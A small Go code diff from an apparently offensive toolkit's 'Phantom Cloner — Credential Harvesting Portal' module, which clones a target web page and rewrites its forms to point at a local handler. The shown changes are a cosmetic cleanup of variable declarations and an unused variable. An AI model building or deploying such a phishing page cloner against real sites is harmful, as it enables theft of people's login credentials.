@@ -14,8 +14,10 @@ import (
 	"github.com/bryanparreira/davoid/internal/modules/ui"
 )
 
-var clonedPage []byte
-var targetBaseURL string
+var (
+	clonedPage    []byte
+	targetBaseURL string
+)
 
 func Run() error {
 	ui.Header("Phantom Cloner — Credential Harvesting Portal")
@@ -128,8 +130,6 @@ func clonePage(target string) ([]byte, error) {
 }
 
 func rewriteForms(html string) string {
-	// Replace form action= with our local handler
-	lower := strings.ToLower(html)
 	result := html
 	start := 0
 	for {
@@ -164,7 +164,6 @@ func rewriteForms(html string) string {
 		result = result[:abs] + newTag + result[abs+end+1:]
 		start = abs + len(newTag)
 	}
-	_ = lower
 	return result
 }
 
